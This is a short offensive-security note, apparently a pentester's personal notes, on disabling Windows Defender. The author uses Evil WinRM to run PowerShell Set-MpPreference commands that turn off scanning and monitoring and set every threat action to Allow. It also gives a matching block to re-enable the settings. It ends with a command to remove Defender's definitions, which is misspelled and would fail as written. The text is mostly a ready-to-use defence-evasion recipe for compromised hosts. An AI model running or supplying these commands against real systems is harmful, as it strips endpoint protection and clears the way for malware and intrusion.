# Disabling Windows Defender
There are a couple of way I do this. the first one is to just shut every thing off. I wuil generally use Evil WinRM for this. This will make registry changes and the changes should be immediate.
```Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue```
The following will turn it back on.
```Set-MpPreference -DisableArchiveScanning 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRemovableDriveScanning 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring 0 -ErrorAction SilentlyContinue
Set-MpPreference -LowThreatDefaultAction Block -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction Block -ErrorAction SilentlyContinue
Set-MpPreference -HighThreatDefaultAction Block -ErrorAction SilentlyContinue```

The other way to do this is to revomve the Definitions File. This should disable Windows Defenders ability to detect anything.

```C:\Program Files\Windows Defender\MpCmdRun.exe -RevoveDefinitions```
